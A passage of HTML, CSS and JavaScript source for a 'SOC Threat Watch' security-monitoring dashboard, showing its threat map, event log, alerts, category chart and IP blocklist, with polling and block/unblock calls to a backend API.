  --bg:#0a0f1c; --panel:#0f1629; --panel-2:#141d33; --line:#1d2842; --line-2:#2a3858;
  --text:#e3e9f5; --muted:#9aa8c7; --faint:#6b7a99;
  --accent:#2dd4bf; --accent-ink:#04201c;
  --crit:#f43f5e; --high:#fb923c; --med:#facc15; --low:#38bdf8; --info:#64748b; --ok:#34d399;
  --sans:'IBM Plex Sans',system-ui,-apple-system,'Segoe UI',sans-serif;
  --mono:'IBM Plex Mono',ui-monospace,'SF Mono',Menlo,Consolas,monospace;
  --r:12px;
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:14px;line-height:1.45}
body{min-height:100vh;background:
  radial-gradient(900px 500px at 0% -10%,rgba(45,212,191,.06),transparent 60%),
  radial-gradient(800px 500px at 100% 110%,rgba(244,63,94,.05),transparent 60%),var(--bg)}
button{font-family:inherit;cursor:pointer}
:focus-visible{outline:2px solid var(--accent);outline-offset:2px}

/* header */
.top{position:sticky;top:0;z-index:50;display:flex;align-items:center;gap:16px;flex-wrap:wrap;
  padding:12px 22px;background:rgba(10,15,28,.86);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
.brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px;letter-spacing:.01em}
.brand-mark{width:30px;height:30px;border-radius:8px;display:grid;place-items:center;
  background:linear-gradient(135deg,#134e4a,#0f766e);box-shadow:inset 0 0 0 1px rgba(45,212,191,.35)}
.brand small{display:block;font-size:11px;font-weight:500;color:var(--faint);letter-spacing:.04em}
.pill{display:inline-flex;align-items:center;gap:7px;padding:4px 10px;border-radius:999px;font-size:12px;font-weight:600;
  border:1px solid var(--line-2);color:var(--muted);background:var(--panel)}
.dot{width:8px;height:8px;border-radius:50%;background:var(--ok);box-shadow:0 0 0 3px rgba(52,211,153,.18)}
.pill.down .dot{background:var(--crit);box-shadow:0 0 0 3px rgba(244,63,94,.18)}
.pill.paused .dot{background:var(--med);box-shadow:0 0 0 3px rgba(250,204,21,.18)}
.spacer{flex:1}
.clock{font-family:var(--mono);font-size:12px;color:var(--faint)}
.btn{display:inline-flex;align-items:center;gap:6px;border-radius:8px;padding:7px 12px;font-size:13px;font-weight:600;
  border:1px solid var(--line-2);background:var(--panel-2);color:var(--text);transition:.15s}
.btn:hover{border-color:var(--faint)}
.btn.primary{background:var(--accent);border-color:var(--accent);color:var(--accent-ink)}
.btn.primary:hover{filter:brightness(1.08)}
.btn.danger{background:rgba(244,63,94,.12);border-color:rgba(244,63,94,.45);color:#fda4af}
.btn.ghost{background:transparent}
.btn.sm{padding:4px 9px;font-size:12px}
.btn:disabled{opacity:.5;cursor:not-allowed}

/* layout */
.page{padding:18px 22px 40px;max-width:1680px;margin:0 auto}
.kpis{display:grid;grid-template-columns:repeat(6,minmax(0,1fr));gap:12px;margin-bottom:16px}
.kpi{background:var(--panel);border:1px solid var(--line);border-radius:var(--r);padding:14px 16px;position:relative;overflow:hidden}
.kpi::after{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--c,var(--accent))}
.kpi-l{font-size:12px;color:var(--muted);font-weight:500}
.kpi-v{font-family:var(--mono);font-size:26px;font-weight:600;margin-top:4px;color:var(--text)}
.kpi-s{font-size:11px;color:var(--faint);margin-top:2px}
.grid{display:grid;grid-template-columns:minmax(0,1.75fr) minmax(290px,1fr) minmax(290px,1fr);gap:16px;align-items:start}
.col{display:flex;flex-direction:column;gap:16px;min-width:0}
.card{background:var(--panel);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;min-width:0}
.card-h{display:flex;align-items:center;gap:10px;padding:12px 16px;border-bottom:1px solid var(--line)}
.card-t{font-size:13px;font-weight:600;letter-spacing:.01em}
.card-sub{font-size:12px;color:var(--faint)}
.card-b{max-height:420px;overflow:auto}
.card-b::-webkit-scrollbar,.tbl-wrap::-webkit-scrollbar{width:8px;height:8px}
.card-b::-webkit-scrollbar-thumb,.tbl-wrap::-webkit-scrollbar-thumb{background:var(--line-2);border-radius:8px}
#map{height:330px;background:#0b1222}
.leaflet-container{background:#0b1222;font-family:var(--sans)}
.leaflet-popup-content-wrapper,.leaflet-popup-tip{background:var(--panel-2);color:var(--text);border:1px solid var(--line-2)}
.leaflet-popup-content{font-size:12px;margin:10px 12px}
.leaflet-control-attribution{background:rgba(10,15,28,.7)!important;color:var(--faint)!important}
.leaflet-control-attribution a{color:var(--muted)!important}
.legend{display:flex;gap:12px;flex-wrap:wrap;font-size:11px;color:var(--muted)}
.legend i{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:5px;vertical-align:middle}

/* filters */
.filters{display:flex;gap:8px;align-items:center;flex-wrap:wrap;padding:10px 16px;border-bottom:1px solid var(--line)}
.chip{border:1px solid var(--line-2);background:transparent;color:var(--muted);border-radius:999px;padding:4px 10px;font-size:12px;font-weight:600}
.chip[aria-pressed="true"]{background:var(--panel-2);color:var(--text);border-color:var(--faint)}
.chip b{font-family:var(--mono);font-weight:500;margin-left:4px;color:var(--faint)}
.search{flex:1;min-width:160px;background:var(--bg);border:1px solid var(--line-2);border-radius:8px;color:var(--text);
  padding:7px 10px;font-family:var(--mono);font-size:12px}
.search::placeholder{color:var(--faint)}

/* table */
.tbl-wrap{max-height:470px;overflow:auto}
table{width:100%;border-collapse:collapse;font-size:12.5px}
th{position:sticky;top:0;background:var(--panel-2);color:var(--muted);font-weight:600;font-size:11.5px;text-align:left;
  padding:8px 12px;border-bottom:1px solid var(--line-2);white-space:nowrap;z-index:1}
td{padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:middle}
tbody tr{cursor:pointer;transition:background .1s}
tbody tr:hover{background:rgba(148,163,184,.06)}
tbody tr.sev-critical{box-shadow:inset 3px 0 0 var(--crit)}
tbody tr.sev-high{box-shadow:inset 3px 0 0 var(--high)}
.mono{font-family:var(--mono)}
.ip{font-family:var(--mono);color:#7dd3fc;font-weight:500;white-space:nowrap}
.tags{margin-top:4px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:250px}
.req{font-family:var(--mono);color:var(--muted);max-width:250px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.req b{color:var(--text);font-weight:600;margin-right:6px}
.loc{color:var(--muted);white-space:nowrap;max-width:170px;overflow:hidden;text-overflow:ellipsis}
.loc.sub{font-size:11.5px;margin-top:2px}
td.mono{white-space:nowrap}
.tag{display:inline-block;font-size:10.5px;font-weight:600;padding:2px 7px;border-radius:5px;margin:1px 3px 1px 0;
  background:rgba(148,163,184,.1);color:var(--muted);border:1px solid rgba(148,163,184,.18);white-space:nowrap}
.sev{display:inline-flex;align-items:center;gap:6px;font-size:11px;font-weight:700;padding:2px 8px;border-radius:999px;
  text-transform:uppercase;letter-spacing:.04em;white-space:nowrap}
.sev-critical .sevc,.sev.critical{color:#fecdd3;background:rgba(244,63,94,.16);border:1px solid rgba(244,63,94,.45)}
.sev.high{color:#fed7aa;background:rgba(251,146,60,.14);border:1px solid rgba(251,146,60,.45)}
.sev.medium{color:#fef08a;background:rgba(250,204,21,.12);border:1px solid rgba(250,204,21,.4)}
.sev.low{color:#bae6fd;background:rgba(56,189,248,.12);border:1px solid rgba(56,189,248,.4)}
.sev.info{color:#cbd5e1;background:rgba(100,116,139,.15);border:1px solid rgba(100,116,139,.4)}
.risk{display:flex;align-items:center;gap:8px;min-width:96px}
.bar{flex:1;height:6px;border-radius:6px;background:var(--line);overflow:hidden}
.bar>span{display:block;height:100%;border-radius:6px}
.risk .n{font-family:var(--mono);font-size:12px;width:24px;text-align:right}

/* lists */
.item{padding:11px 16px;border-bottom:1px solid var(--line)}
.item:last-child{border-bottom:none}
.item-top{display:flex;align-items:center;gap:8px;justify-content:space-between;margin-bottom:4px}
.item-msg{font-size:12.5px;color:var(--text);word-break:break-word}
.item-meta{font-size:11.5px;color:var(--faint);margin-top:3px}
.empty{padding:28px 18px;text-align:center;color:var(--faint);font-size:12.5px}
.empty strong{display:block;color:var(--muted);margin-bottom:4px;font-size:13px}
.catrow{display:grid;grid-template-columns:130px 1fr 34px;gap:10px;align-items:center;padding:7px 16px;font-size:12.5px}
.catrow .lbl{color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.catrow .cnt{font-family:var(--mono);text-align:right;color:var(--text)}
.src{display:flex;align-items:center;gap:10px;padding:9px 16px;border-bottom:1px solid var(--line);font-size:12.5px}
.src:last-child{border-bottom:none}
.src .grow{flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.src>*:not(.grow){flex-shrink:0}
.kw{display:flex;align-items:center;gap:10px;padding:8px 16px;border-bottom:1px solid var(--line);font-size:12.5px}
.kw .k{flex:1;font-family:var(--mono);color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.kw .c{font-size:11px;color:var(--muted);white-space:nowrap}
.kw .x{font-family:var(--mono);color:var(--faint);font-size:12px}
.blockform{display:flex;gap:8px;padding:12px 16px;border-bottom:1px solid var(--line)}
.blockform input{flex:1;min-width:0;background:var(--bg);border:1px solid var(--line-2);border-radius:8px;color:var(--text);
  padding:7px 10px;font-family:var(--mono);font-size:12px}

/* drawer */
.scrim{position:fixed;inset:0;background:rgba(2,6,16,.6);opacity:0;pointer-events:none;transition:.2s;z-index:80}
.scrim.open{opacity:1;pointer-events:auto}
.drawer{position:fixed;top:0;right:0;height:100vh;height:100dvh;width:min(520px,100%);background:var(--panel);border-left:1px solid var(--line-2);
  transform:translateX(100%);transition:transform .22s ease;z-index:90;display:flex;flex-direction:column}
.drawer.open{transform:none}
.drawer-h{display:flex;align-items:center;gap:10px;padding:16px 18px;border-bottom:1px solid var(--line)}
.drawer-b{flex:1;overflow:auto;padding:16px 18px}
.kv{display:grid;grid-template-columns:110px 1fr;gap:6px 12px;font-size:12.5px;margin-bottom:16px}
.kv dt{color:var(--faint)}
.kv dd{font-family:var(--mono);word-break:break-all;color:var(--text)}
.sect{font-size:11px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--faint);margin:14px 0 8px}
.hits{width:100%;font-size:12px}
.hits td,.hits th{padding:6px 8px;cursor:default}
.drawer-f{display:flex;gap:8px;padding:14px 18px;border-top:1px solid var(--line)}

/* toast */
.toasts{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);display:flex;flex-direction:column;gap:8px;z-index:100}
.toast{background:var(--panel-2);border:1px solid var(--line-2);color:var(--text);padding:10px 14px;border-radius:10px;font-size:13px;
  box-shadow:0 10px 30px rgba(0,0,0,.4);animation:up .2s ease}
.toast.err{border-color:rgba(244,63,94,.5)}
@keyframes up{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}

@media (max-width:1280px){.grid{grid-template-columns:minmax(0,1fr) minmax(0,1fr)}.col.main{grid-column:1/-1}.kpis{grid-template-columns:repeat(3,1fr)}}
@media (max-width:760px){.grid{grid-template-columns:1fr}.kpis{grid-template-columns:repeat(2,1fr)}.page{padding:12px}
  .top{padding:10px 12px}.clock{display:none}#map{height:240px}.catrow{grid-template-columns:100px 1fr 30px}}
@media (prefers-reduced-motion:reduce){*{transition:none!important;animation:none!important}}
</style>
</head>
<body>
<header class="top">
  <div class="brand"><div class="brand-mark">🛡</div><div>SOC Threat Watch<small id="rules-lbl">Loading rules…</small></div></div>
  <span class="pill" id="status"><span class="dot"></span><span id="status-t">Connecting…</span></span>
  <div class="spacer"></div>
  <span class="clock" id="clock"></span>
  <button class="btn ghost" id="pause-btn" aria-pressed="false">⏸ Pause</button>
  <button class="btn primary" id="demo-btn">▶ Run demo traffic</button>
</header>

<main class="page">
  <section class="kpis" aria-label="Summary">
    <div class="kpi" style="--c:var(--accent)"><div class="kpi-l">Events</div><div class="kpi-v" id="k-total">0</div><div class="kpi-s" id="k-total-s">all time</div></div>
    <div class="kpi" style="--c:var(--crit)"><div class="kpi-l">Critical</div><div class="kpi-v" id="k-crit">0</div><div class="kpi-s">risk ≥ 80</div></div>
    <div class="kpi" style="--c:var(--high)"><div class="kpi-l">High</div><div class="kpi-v" id="k-high">0</div><div class="kpi-s">risk 55–79</div></div>
    <div class="kpi" style="--c:var(--low)"><div class="kpi-l">Unique sources</div><div class="kpi-v" id="k-ips">0</div><div class="kpi-s">in current window</div></div>
    <div class="kpi" style="--c:var(--med)"><div class="kpi-l">Alerts</div><div class="kpi-v" id="k-alerts">0</div><div class="kpi-s">deduplicated</div></div>
    <div class="kpi" style="--c:#a78bfa"><div class="kpi-l">Blocked IPs</div><div class="kpi-v" id="k-block">0</div><div class="kpi-s">manual + automatic</div></div>
  </section>

  <div class="grid">
    <div class="col main">
      <section class="card">
        <div class="card-h"><span class="card-t">Threat map</span><span class="spacer"></span>
          <div class="legend"><span><i style="background:var(--crit)"></i>Critical</span><span><i style="background:var(--high)"></i>High</span>
          <span><i style="background:var(--med)"></i>Medium</span><span><i style="background:var(--low)"></i>Low</span></div></div>
        <div id="map"></div>
      </section>
      <section class="card">
        <div class="card-h"><span class="card-t">Event log</span><span class="card-sub" id="ev-count">0 shown</span></div>
        <div class="filters" role="toolbar" aria-label="Severity filter" id="sev-filters"></div>
        <div class="filters" style="border-bottom:none;padding-top:0"><input class="search" id="search" type="search" placeholder="Filter by IP, path, tag, country…" aria-label="Search events"></div>
        <div class="tbl-wrap">
          <table><thead><tr><th>Time</th><th>Source</th><th>Request &amp; findings</th><th>Risk</th></tr></thead>
          <tbody id="ev-body"></tbody></table>
        </div>
      </section>
    </div>

    <div class="col">
      <section class="card">
        <div class="card-h"><span class="card-t">Live alerts</span><span class="spacer"></span><button class="btn sm ghost" id="clear-alerts">Clear view</button></div>
        <div class="card-b" id="alerts"></div>
      </section>
      <section class="card">
        <div class="card-h"><span class="card-t">Threat categories</span><span class="card-sub">current window</span></div>
        <div class="card-b" id="cats" style="padding:8px 0"></div>
      </section>
    </div>

    <div class="col">
      <section class="card">
        <div class="card-h"><span class="card-t">Blocklist</span><span class="card-sub" id="bl-count"></span></div>
        <form class="blockform" id="block-form" autocomplete="off">
          <input id="block-ip" placeholder="IP address to block" aria-label="IP address to block" inputmode="decimal">
          <button class="btn danger sm" type="submit">Block</button>
        </form>
        <div class="card-b" id="blocklist" style="max-height:260px"></div>
      </section>
      <section class="card">
        <div class="card-h"><span class="card-t">Top sources</span><span class="card-sub">by peak risk</span></div>
        <div class="card-b" id="sources"></div>
      </section>
      <section class="card">
        <div class="card-h"><span class="card-t">Matched indicators</span><span class="card-sub">most frequent</span></div>
        <div class="card-b" id="keywords"></div>
      </section>
    </div>
  </div>
</main>

<div class="scrim" id="scrim"></div>
<aside class="drawer" id="drawer" role="dialog" aria-modal="true" aria-labelledby="dr-title">
  <div class="drawer-h"><span class="card-t" id="dr-title">Event</span><span class="spacer" style="flex:1"></span><button class="btn sm ghost" id="dr-close" aria-label="Close">✕</button></div>
  <div class="drawer-b" id="dr-body"></div>
  <div class="drawer-f" id="dr-foot"></div>
</aside>
<div class="toasts" id="toasts" aria-live="polite"></div>

<script>
"use strict";
const SEV_ORDER = ["critical","high","medium","low","info"];
const SEV_HEX = {critical:"#f43f5e", high:"#fb923c", medium:"#facc15", low:"#38bdf8", info:"#64748b"};
const CAT_HEX = {exploit:"#f43f5e", honeypot:"#e879f9", ransomware_extortion:"#fb7185", malware_delivery:"#fb923c",
  exfiltration:"#f97316", financial_fraud:"#facc15", phishing:"#fde047", identity_theft:"#a78bfa",
  social_engineering:"#c084fc", reconnaissance:"#38bdf8", bot_automation:"#2dd4bf", emerging_2025:"#4ade80"};
const S = {events:[], alerts:[], lastEv:0, lastAl:0, sev:"all", q:"", paused:false, inflight:false,
  labels:{}, markers:{}, blocklist:{}, alertsClearedAt:0, openId:null};
const $ = id => document.getElementById(id);
const esc = v => String(v ?? "").replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
const fmtTime = iso => { const d = new Date(iso); return isNaN(d) ? "" : d.toLocaleTimeString([], {hour:"2-digit",minute:"2-digit",second:"2-digit",hourCycle:"h23"}); };
const label = c => S.labels[c] || String(c).replace(/_/g," ").toLowerCase().replace(/^./, m => m.toUpperCase());
const flag = cc => (cc && /^[A-Z]{2}$/.test(cc)) ? String.fromCodePoint(...[...cc].map(ch => 127397 + ch.charCodeAt(0))) : "";
const sevPill = s => `<span class="sev ${esc(s)}">${esc(s)}</span>`;
const riskCell = (r, s) => `<div class="risk"><div class="bar"><span style="width:${Math.max(2, Math.min(100, r))}%;background:${SEV_HEX[s] || SEV_HEX.info}"></span></div><span class="n">${Number(r) || 0}</span></div>`;
const isIP = v => /^(\d{1,3}\.){3}\d{1,3}$/.test(v) || /^[0-9a-f:]+$/i.test(v) && v.includes(":");

function toast(msg, err) {
  const t = document.createElement("div");
  t.className = "toast" + (err ? " err" : ""); t.textContent = msg;
  $("toasts").appendChild(t); setTimeout(() => t.remove(), 3800);
}

async function api(path, opts = {}, retried = false) {
  const headers = Object.assign({"Content-Type": "application/json"}, opts.headers || {});
  let tok = null; try { tok = sessionStorage.getItem("socToken"); } catch (e) {}
  if (tok) headers["X-SOC-Token"] = tok;
  const res = await fetch(path, Object.assign({}, opts, {headers}));
  if (res.status === 401 && !retried) {
    const t = prompt("Admin token required for this action:");
    if (t) { try { sessionStorage.setItem("socToken", t); } catch (e) {} return api(path, opts, true); }
  }
  let data = null; try { data = await res.json(); } catch (e) {}
  if (!res.ok) throw new Error((data && data.error) || `HTTP ${res.status}`);
  return data;
}

/* ── map ── */
let map = null;
function initMap() {
  if (typeof L === "undefined") {
    $("map").innerHTML = '<div class="empty"><strong>Map unavailable</strong>The map library could not load (offline?). All other panels still work.</div>';
    return;
  }
  map = L.map("map", {worldCopyJump: true, minZoom: 1}).setView([25, 10], 2);
  L.tileLayer("https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png",
    {subdomains: "abcd", maxZoom: 18, attribution: "&copy; OpenStreetMap contributors &copy; CARTO"}).addTo(map);
}
function popupHtml(e, n) {
  return `<b class="mono">${esc(e.ip)}</b><br>${esc(e.city)}${e.country ? ", " + esc(e.country) : ""}<br>${esc(e.org || "")}<br>` +
         `Peak risk <b>${Number(e.risk)}</b> · ${n} event${n === 1 ? "" : "s"}`;
}
function upsertMarker(e) {
  if (!map || typeof e.lat !== "number" || typeof e.lon !== "number") return;
  const m = S.markers[e.ip];
  if (m) {
    m.n++;
    if (e.risk > m.risk) { m.risk = e.risk; m.layer.setStyle({color: SEV_HEX[e.severity], fillColor: SEV_HEX[e.severity]}); m.ev = e; }
    m.layer.setRadius(Math.min(5 + m.n * 0.5, 14)); m.layer.setPopupContent(popupHtml(m.ev, m.n));
    return;
  }
  const c = SEV_HEX[e.severity] || SEV_HEX.info;
  const layer = L.circleMarker([e.lat, e.lon], {radius: 6, color: c, fillColor: c, fillOpacity: .5, weight: 1.5}).addTo(map);
  layer.bindPopup(popupHtml(e, 1));
  S.markers[e.ip] = {layer, risk: e.risk, n: 1, ev: e};
}

/* ── events ── */
function sevCounts() { const c = {all: S.events.length}; SEV_ORDER.forEach(s => c[s] = 0); S.events.forEach(e => c[e.severity]++); return c; }
function renderFilters() {
  const c = sevCounts();
  $("sev-filters").innerHTML = ["all", ...SEV_ORDER].map(s =>
    `<button class="chip" data-sev="${s}" aria-pressed="${S.sev === s}">${s === "all" ? "All" : s[0].toUpperCase() + s.slice(1)}<b>${c[s]}</b></button>`).join("");
}
function matchesQuery(e, q) {
  return [e.ip, e.path, e.query, e.city, e.country, e.cc, e.org, e.ua, e.method, ...(e.threat_tags || [])]
    .some(v => String(v || "").toLowerCase().includes(q));
}
function renderEvents() {
  const q = S.q.trim().toLowerCase();
  const rows = S.events.filter(e => (S.sev === "all" || e.severity === S.sev) && (!q || matchesQuery(e, q))).slice(0, 300);
  $("ev-count").textContent = `${rows.length} shown · ${S.events.length} loaded`;
  if (!rows.length) {
    $("ev-body").innerHTML = S.events.length
      ? '<tr><td colspan="4" class="empty"><strong>No matches</strong>Try another filter or search.</td></tr>'
      : '<tr><td colspan="4" class="empty"><strong>Waiting for traffic</strong>Send requests to <span class="mono">/log</span> or click “Run demo traffic”.</td></tr>';
    return;
  }
  $("ev-body").innerHTML = rows.map(e => {
    const req = e.path + (e.query ? "?" + e.query : "");
    const tags = (e.threat_tags || []).slice(0, 2).map(t => `<span class="tag">${esc(label(t.toLowerCase()))}</span>`).join("") +
                 ((e.threat_tags || []).length > 2 ? `<span class="tag">+${e.threat_tags.length - 2}</span>` : "") ||
                 '<span style="color:var(--faint)">—</span>';
    return `<tr class="sev-${esc(e.severity)}" data-id="${Number(e.id)}" tabindex="0">
      <td class="mono" style="color:var(--muted)">${esc(fmtTime(e.time))}</td>
      <td><div class="ip">${esc(e.ip)}</div>
        <div class="loc sub">${e.blocked ? '<span style="color:#fda4af">⛔ blocked</span> · ' : ""}${flag(e.cc)} ${esc(e.city)}${e.cc && e.cc !== "LAN" ? ", " + esc(e.cc) : ""}</div></td>
      <td><div class="req" title="${esc(req)}"><b>${esc(e.method)}</b>${esc(req)}</div><div class="tags">${tags}</div></td>
      <td>${riskCell(e.risk, e.severity)}</td></tr>`;
  }).join("");
}

/* ── alerts ── */
function renderAlerts() {
  const list = S.alerts.filter(a => a.id > S.alertsClearedAt).slice(0, 120);
  $("alerts").innerHTML = list.length ? list.map(a => `
    <div class="item"><div class="item-top">${sevPill(a.severity)}<span class="mono" style="font-size:11.5px;color:var(--faint)">${esc(fmtTime(a.time))}</span></div>
    <div class="item-msg">${esc(a.reason)}</div>
    <div class="item-meta"><span class="ip">${esc(a.ip)}</span> · ${esc(label(String(a.category).toLowerCase()))} · risk ${Number(a.risk)}</div></div>`).join("")
    : '<div class="empty"><strong>No alerts</strong>Alerts appear here when a request matches high-impact rules.</div>';
}

/* ── side panels ── */
function renderCats(cats) {
  const entries = Object.entries(cats || {});
  if (!entries.length) { $("cats").innerHTML = '<div class="empty">No threat categories matched yet.</div>'; return; }
  const max = Math.max(...entries.map(([, v]) => v));
  $("cats").innerHTML = entries.map(([c, v]) => `<div class="catrow"><span class="lbl" title="${esc(label(c))}">${esc(label(c))}</span>
    <div class="bar"><span style="width:${(v / max) * 100}%;background:${CAT_HEX[c] || "#94a3b8"}"></span></div><span class="cnt">${v}</span></div>`).join("");
}
function renderSources(top) {
  $("sources").innerHTML = (top && top.length) ? top.map(s => `<div class="src">
    <span class="ip">${esc(s.ip)}</span><span class="grow loc">${flag(s.cc)} ${esc(s.city || "")}</span>
    <span class="mono" style="color:var(--faint);font-size:12px">${s.count}×</span>${sevPill(s.severity)}
    ${s.blocked ? '<span class="tag">blocked</span>' : `<button class="btn sm ghost" data-block="${esc(s.ip)}" title="Block ${esc(s.ip)}">Block</button>`}
    </div>`).join("") : '<div class="empty">No sources yet.</div>';
}
function renderKeywords() {
  const agg = new Map();
  S.events.forEach(e => (e.keyword_hits || []).forEach(h => {
    const k = h.category + "|" + h.keyword; const cur = agg.get(k) || {cat: h.category, kw: h.keyword, n: 0}; cur.n++; agg.set(k, cur);
  }));
  const top = [...agg.values()].sort((a, b) => b.n - a.n).slice(0, 25);
  $("keywords").innerHTML = top.length ? top.map(h => `<div class="kw"><span class="k" title="${esc(h.kw)}">${esc(h.kw.replace(/^regex:/, "pattern: "))}</span>
    <span class="c" style="color:${CAT_HEX[h.cat] || "var(--muted)"}">${esc(label(h.cat))}</span><span class="x">${h.n}×</span></div>`).join("")
    : '<div class="empty">No indicators matched yet.</div>';
}
function renderBlocklist() {
  const entries = Object.entries(S.blocklist);
  $("bl-count").textContent = entries.length ? `${entries.length} blocked` : "";
  $("blocklist").innerHTML = entries.length ? entries.map(([ip, info]) => `<div class="item">
    <div class="item-top"><span class="ip">${esc(ip)}</span><button class="btn sm ghost" data-unblock="${esc(ip)}">Unblock</button></div>
    <div class="item-msg" style="color:var(--muted)">${esc(info.reason)}</div>
    <div class="item-meta">${esc(info.source)} · ${esc(fmtTime(info.time))}</div></div>`).join("")
    : '<div class="empty">No blocked IPs.</div>';
}
function renderStats(st) {
  S.labels = st.labels || S.labels;
  $("k-total").textContent = st.total.toLocaleString();
  $("k-total-s").textContent = `${st.window.toLocaleString()} in window`;
  $("k-crit").textContent = st.severity.critical; $("k-high").textContent = st.severity.high;
  $("k-ips").textContent = st.unique_ips; $("k-alerts").textContent = st.alerts; $("k-block").textContent = st.blocklist;
  $("rules-lbl").textContent = `${st.rules} detection rules · 12 categories`;
  renderCats(st.categories); renderSources(st.top_sources);
}

/* ── drawer ── */
function openEvent(id) {
  const e = S.events.find(x => x.id === id); if (!e) return;
  S.openId = id;
  $("dr-title").innerHTML = `Event #${e.id} ${sevPill(e.severity)}`;
  const kv = [["Time", new Date(e.time).toLocaleString()], ["Source IP", e.ip], ["Location", [e.city, e.country].filter(Boolean).join(", ") || "Unknown"],
    ["Network", e.org || "—"], ["Method", e.method], ["Path", e.path], ["Query", e.query || "—"], ["User-Agent", e.ua || "(missing)"],
    ["Referrer", e.referrer || "—"], ["Risk", `${e.risk}/100 (geo +${e.geo_risk || 0})`], ["Rate", `${e.rate_count} req / 60s`],
    ["Status", e.blocked ? "Blocked (403)" : "Allowed"]];
  const hits = (e.keyword_hits || []);
  $("dr-body").innerHTML = `<dl class="kv">${kv.map(([k, v]) => `<dt>${esc(k)}</dt><dd>${esc(v)}</dd>`).join("")}</dl>
    <div class="sect">Tags</div><div>${(e.threat_tags || []).map(t => `<span class="tag">${esc(label(t.toLowerCase()))}</span>`).join("") || '<span style="color:var(--faint)">None</span>'}</div>
    <div class="sect">Matched indicators</div>
    ${hits.length ? `<table class="hits"><thead><tr><th>Category</th><th>Indicator</th><th>Found in</th><th>Weight</th></tr></thead><tbody>
      ${hits.map(h => `<tr><td>${esc(label(h.category))}</td><td class="mono">${esc(h.keyword.replace(/^regex:/, "pattern: "))}</td><td>${esc(h.source)}</td><td class="mono">+${Number(h.weight)}</td></tr>`).join("")}
      </tbody></table>` : '<div style="color:var(--faint);font-size:12.5px">No rule matched — risk comes from geo / rate / request anomalies only.</div>'}`;
  const isBlocked = !!S.blocklist[e.ip];
  $("dr-foot").innerHTML = `${isBlocked ? `<button class="btn" data-unblock="${esc(e.ip)}">Unblock ${esc(e.ip)}</button>` : `<button class="btn danger" data-block="${esc(e.ip)}">Block ${esc(e.ip)}</button>`}
    <button class="btn ghost" id="copy-json">Copy JSON</button>`;
  $("scrim").classList.add("open"); $("drawer").classList.add("open"); $("dr-close").focus();
}
function closeDrawer() { $("scrim").classList.remove("open"); $("drawer").classList.remove("open"); S.openId = null; }

/* ── actions ── */
async function blockIp(ip, reason) {
  try { await api("/api/block", {method: "POST", body: JSON.stringify({ip, reason: reason || "Manual block via dashboard"})}); toast(`Blocked ${ip}`); await refreshBlocklist(); }
  catch (e) { toast(`Block failed: ${e.message}`, true); }
}
async function unblockIp(ip) {
  try { await api("/api/unblock", {method: "POST", body: JSON.stringify({ip})}); toast(`Unblocked ${ip}`); await refreshBlocklist(); }
  catch (e) { toast(`Unblock failed: ${e.message}`, true); }
}
async function refreshBlocklist() { S.blocklist = await api("/api/blocklist"); renderBlocklist(); if (S.openId) openEvent(S.openId); }

document.addEventListener("click", ev => {
  const t = ev.target.closest("[data-block],[data-unblock],[data-sev],tr[data-id],#copy-json");
  if (!t) return;
  if (t.dataset.block) blockIp(t.dataset.block);
  else if (t.dataset.unblock) unblockIp(t.dataset.unblock);
  else if (t.dataset.sev) { S.sev = t.dataset.sev; renderFilters(); renderEvents(); }
  else if (t.dataset.id) openEvent(Number(t.dataset.id));
  else if (t.id === "copy-json") {
    const e = S.events.find(x => x.id === S.openId);
    navigator.clipboard?.writeText(JSON.stringify(e, null, 2)).then(() => toast("Event JSON copied"), () => toast("Copy failed", true));
  }
});
document.addEventListener("keydown", ev => {
  if (ev.key === "Escape") closeDrawer();
  if (ev.key === "Enter" && ev.target.matches && ev.target.matches("tr[data-id]")) openEvent(Number(ev.target.dataset.id));
});
$("scrim").addEventListener("click", closeDrawer);
$("dr-close").addEventListener("click", closeDrawer);
$("search").addEventListener("input", ev => { S.q = ev.target.value; renderEvents(); });
$("clear-alerts").addEventListener("click", () => { S.alertsClearedAt = S.lastAl; renderAlerts(); });
$("block-form").addEventListener("submit", ev => {
  ev.preventDefault(); const ip = $("block-ip").value.trim();
  if (!isIP(ip)) { toast("Enter a valid IPv4 or IPv6 address", true); return; }
  $("block-ip").value = ""; blockIp(ip);
});
$("pause-btn").addEventListener("click", () => {
  S.paused = !S.paused;
  $("pause-btn").textContent = S.paused ? "▶ Resume" : "⏸ Pause";
  $("pause-btn").setAttribute("aria-pressed", S.paused);
  setStatus(S.paused ? "paused" : "live");
  if (!S.paused) poll();
});
$("demo-btn").addEventListener("click", async () => {
  const b = $("demo-btn"); b.disabled = true;
  try { const r = await api("/api/demo", {method: "POST"}); toast(`Demo started — ${r.events} requests over ~15s`); }
  catch (e) { toast(e.message === "already running" ? "Demo already running" : `Demo failed: ${e.message}`, true); }
  setTimeout(() => b.disabled = false, 4000);
});

function setStatus(mode) {
  const p = $("status"); p.classList.remove("down", "paused");
  if (mode === "down") { p.classList.add("down"); $("status-t").textContent = "Disconnected"; }
  else if (mode === "paused") { p.classList.add("paused"); $("status-t").textContent = "Paused"; }
  else $("status-t").textContent = "Live";
}

/* ── polling ── */
async function poll() {
  if (S.paused || S.inflight) return;
  S.inflight = true;
  try {
    const [ev, al, st, bl] = await Promise.all([
      api(`/api/logs?after_id=${S.lastEv}&limit=500`), api(`/api/alerts?after_id=${S.lastAl}&limit=500`),
      api("/api/stats"), api("/api/blocklist")]);
    if (ev.length) {
      S.lastEv = ev[ev.length - 1].id;
      ev.forEach(upsertMarker);
